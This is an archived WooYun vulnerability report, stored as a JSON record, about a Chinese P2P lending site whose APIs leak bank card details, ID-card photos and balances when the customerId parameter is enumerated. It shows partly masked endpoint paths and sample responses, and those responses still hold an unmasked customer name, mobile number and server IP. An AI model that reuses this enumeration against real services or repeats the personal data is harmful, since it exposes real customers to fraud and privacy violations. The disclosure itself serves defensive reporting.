{"id": 16101, "wybug_id": "wooyun-2015-0126268", "wybug_title": "P2P金融安全之意真金融漏洞可泄露大量用户信息（银行卡号/电话/身份证照片/余额查询等）", "wybug_corp": "意真（上海）金融信息服务有限公司", "wybug_author": "Jinone", "wybug_date": "2015-07-13 10:54", "wybug_open_date": "2015-07-18 10:56", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 傻 详细说明：  之前提交了密码重置   给我4rank      现在各种信息全有了。提现还是问题吗? 这个应该是用户的id 14051005#1. 银行卡号查询遍历参数 customerId\n\nmask 区域\n1.https://**.**.**/esb/account/customer/bankInfo/listcustomerId=14051005&\n\n \n\n#2. 身份证照片遍历看这里，图片的规则先遍历是很难的 \n\nmask 区域\n1.http://**.**.**/upload/attachment5/14051005/00150001/1432363081128.jpg\n\n 但是我们只要通过遍历用户id 就能查看到图片信息。 我这边用burpsutie ,提取出来#\n\nmask 区域\n1.https://**.**.**/esb/account/customer/cardInfo/auditcustomerId=14051005&\n\n访问后是这样的 \n{  \"success\" : true,  \"message\" : \"\",  \"attr\" : {    \"customerInfo\" : {      \"name\" : null,      \"cardId\" : null,      \"foreUrl\" : \"\",      \"foreThumbUrl\" : \"\",      \"backUrl\" : \"\",      \"backThumbUrl\" : \"\",      \"handUrl\" : \"\",      \"handThumbUrl\" : \"\",      \"status\" : \"\"    },    \"cardList\" : [ {      \"id\" : 14098725,      \"customerId\" : 14051005,      \"optSource\" : null,      \"autid\" : 0,      \"type\" : \"00150001\",\n\nmask 区域\n\n*****0/upload/attachment5/1405100*****\n\n\n\n      \"subFilePath\" : null,\n\n\n\nmask 区域\n\n*****00/upload/attachment5/14051*****\n\n\n\n      \"status\" : \"00210001\",      \"version\" : null,      \"createDate\" : null,      \"creatorId\" : null,      \"modifyDate\" : null,      \"modifyerId\" : null,      \"remark\" : null    }, {      \"id\" : 14098726,      \"customerId\" : 14051005,      \"optSource\" : null,      \"autid\" : 0,      \"type\" : \"00150002\",\n\n\n\nmask 区域\n\n*****0/upload/attachment5/1405100*****\n\n\n\n      \"subFilePath\" : null,\n\n\n\nmask 区域\n\n*****00/upload/attachment5/14051*****\n\n\n\n      \"status\" : \"00210001\",      \"version\" : null,      \"createDate\" : null,      \"creatorId\" : null,      \"modifyDate\" : null,      \"modifyerId\" : null,      \"remark\" : null    }, {      \"id\" : 14098727,      \"customerId\" : 14051005,      \"optSource\" : null,      \"autid\" : 0,      \"type\" : \"00150003\",      \"storePath\" : \"http://140.207.169.83:8000/upload/attachment5/14051005/00150003/1432363081184.jpg\",      \"subFilePath\" : null,\n\n\n\nmask 区域\n\n*****00/upload/attachment5/14051*****\n\n\n\n      \"status\" : \"00210001\",      \"version\" : null,      \"createDate\" : null,      \"creatorId\" : null,      \"modifyDate\" : null,      \"modifyerId\" : null,      \"remark\" : null    } ]  }}\n\n\n\n\n\n\nmask 区域\n1.http://**.**.**/upload/attachment5/14033105/00150001/1432291395569.jpg\n\n#3. 然后是余额查询\n\nmask 区域\n1.https://**.**.**/esb/fortune/customer/accountinfocustomerId=14087605&\n\n# 可以看到有2800\n{  \"success\" : true,  \"message\" : \"\",  \"attr\" : {    \"customerAccVo\" : {      \"customerId\" : \"14087605\",      \"mobile\" : \"13372530130\",      \"cnName\" : \"曹金富\",      \"recomCode\" : \"w5dhx2\",      \"status\" : \"0\",      \"avlBal\" : 0.0,      \"credAmount\" : 2800.0,      \"currPay\" : 0.0,      \"fortuneAmount\" : 0.0,      \"currProfit\" : 0.0,      \"redNum\" : 0,      \"recomProfits\" : 0.0,      \"withdrawStatus\" : \"0\",      \"myRecomPerson\" : null,      \"allNotRepayAmt\" : 0.0    },    \"surplusLuckNum\" : 0,    \"unReadMsgCount\" : 1  }}\n   漏洞证明：  之前提交了密码重置   给我4rank      现在各种信息全有了。提现还是问题吗? 这个应该是用户的id 14051005#1. 银行卡号查询遍历参数 customerId\n\nmask 区域\n1.https://**.**.**/esb/account/customer/bankInfo/listcustomerId=14051005&\n\n \n\n#2. 身份证照片遍历看这里，图片的规则先遍历是很难的 \n\nmask 区域\n1.http://**.**.**/upload/attachment5/14051005/00150001/1432363081128.jpg\n\n 但是我们只要通过遍历用户id 就能查看到图片信息。 我这边用burpsutie ,提取出来#\n\nmask 区域\n1.https://**.**.**/esb/account/customer/cardInfo/auditcustomerId=14051005&\n\n访问后是这样的 \n{  \"success\" : true,  \"message\" : \"\",  \"attr\" : {    \"customerInfo\" : {      \"name\" : null,      \"cardId\" : null,      \"foreUrl\" : \"\",      \"foreThumbUrl\" : \"\",      \"backUrl\" : \"\",      \"backThumbUrl\" : \"\",      \"handUrl\" : \"\",      \"handThumbUrl\" : \"\",      \"status\" : \"\"    },    \"cardList\" : [ {      \"id\" : 14098725,      \"customerId\" : 14051005,      \"optSource\" : null,      \"autid\" : 0,      \"type\" : \"00150001\",\n\nmask 区域\n\n*****0/upload/attachment5/1405100*****\n\n\n\n      \"subFilePath\" : null,\n\n\n\nmask 区域\n\n*****00/upload/attachment5/14051*****\n\n\n\n      \"status\" : \"00210001\",      \"version\" : null,      \"createDate\" : null,      \"creatorId\" : null,      \"modifyDate\" : null,      \"modifyerId\" : null,      \"remark\" : null    }, {      \"id\" : 14098726,      \"customerId\" : 14051005,      \"optSource\" : null,      \"autid\" : 0,      \"type\" : \"00150002\",\n\n\n\nmask 区域\n\n*****0/upload/attachment5/1405100*****\n\n\n\n      \"subFilePath\" : null,\n\n\n\nmask 区域\n\n*****00/upload/attachment5/14051*****\n\n\n\n      \"status\" : \"00210001\",      \"version\" : null,      \"createDate\" : null,      \"creatorId\" : null,      \"modifyDate\" : null,      \"modifyerId\" : null,      \"remark\" : null    }, {      \"id\" : 14098727,      \"customerId\" : 14051005,      \"optSource\" : null,      \"autid\" : 0,      \"type\" : \"00150003\",      \"storePath\" : \"http://140.207.169.83:8000/upload/attachment5/14051005/00150003/1432363081184.jpg\",      \"subFilePath\" : null,\n\n\n\nmask 区域\n\n*****00/upload/attachment5/14051*****\n\n\n\n      \"status\" : \"00210001\",      \"version\" : null,      \"createDate\" : null,      \"creatorId\" : null,      \"modifyDate\" : null,      \"modifyerId\" : null,      \"remark\" : null    } ]  }}\n\n\n\n\n\n\nmask 区域\n1.http://**.**.**/upload/attachment5/14033105/00150001/1432291395569.jpg\n\n#3. 然后是余额查询\n\nmask 区域\n1.https://**.**.**/esb/fortune/customer/accountinfocustomerId=14087605&\n\n# 可以看到有2800\n{  \"success\" : true,  \"message\" : \"\",  \"attr\" : {    \"customerAccVo\" : {      \"customerId\" : \"14087605\",      \"mobile\" : \"13372530130\",      \"cnName\" : \"曹金富\",      \"recomCode\" : \"w5dhx2\",      \"status\" : \"0\",      \"avlBal\" : 0.0,      \"credAmount\" : 2800.0,      \"currPay\" : 0.0,      \"fortuneAmount\" : 0.0,      \"currProfit\" : 0.0,      \"redNum\" : 0,      \"recomProfits\" : 0.0,      \"withdrawStatus\" : \"0\",      \"myRecomPerson\" : null,      \"allNotRepayAmt\" : 0.0    },    \"surplusLuckNum\" : 0,    \"unReadMsgCount\" : 1  }}\n   修复方案：  希望尽快修复，不要被不法分子利用了   版权声明：转载请注明来源 Jinone@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-18 10:56 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 2015-09-10：非常感谢，漏洞已处理  ", "replys": "漏洞评价：\n评论\n     2015-07-29 15:21 |    \t\t清清侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:15        | %0d%0a)\t\t \n  这都忽略，  这是p2p网站吗。。    \n     2015-09-10 16:03 |    \t\t意真（上海）金融信息服务有限公司(乌云厂商)\t\t \n  非常感谢，漏洞已处理    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}